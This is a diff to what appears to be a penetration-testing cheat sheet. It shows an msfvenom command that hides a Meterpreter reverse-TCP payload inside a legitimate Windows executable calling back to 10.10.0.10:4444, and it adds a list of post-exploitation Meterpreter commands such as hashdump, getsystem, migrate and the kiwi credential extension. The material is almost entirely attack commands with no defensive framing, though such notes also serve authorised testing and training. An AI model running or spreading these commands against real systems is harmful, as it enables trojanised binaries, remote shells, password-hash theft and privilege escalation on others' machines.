@@ -60,8 +60,20 @@ Add a user in windows with msfvenom:
     
 Embed a payload within a legitimate binary:    
 
-    msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows LHOST=10.10.0.10 LPORT=4444 -o tmp.exe -k -x 'Name.exe'    
-   
+    msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows LHOST=10.10.0.10 LPORT=4444 -o tmp.exe -k -x 'Name.exe'   
+    
+### Useful Meterpreter Commands      
+    
+    help
+	   hashdump    
+    getuid   
+    ps   
+    migrate <pid>    	
+    search -f <file name>
+	   Shell
+	   getsystem
+    Load python (or other extension), kiwi      
+
 ### Netcat
 upload static binary nc.exe and invoke 
 
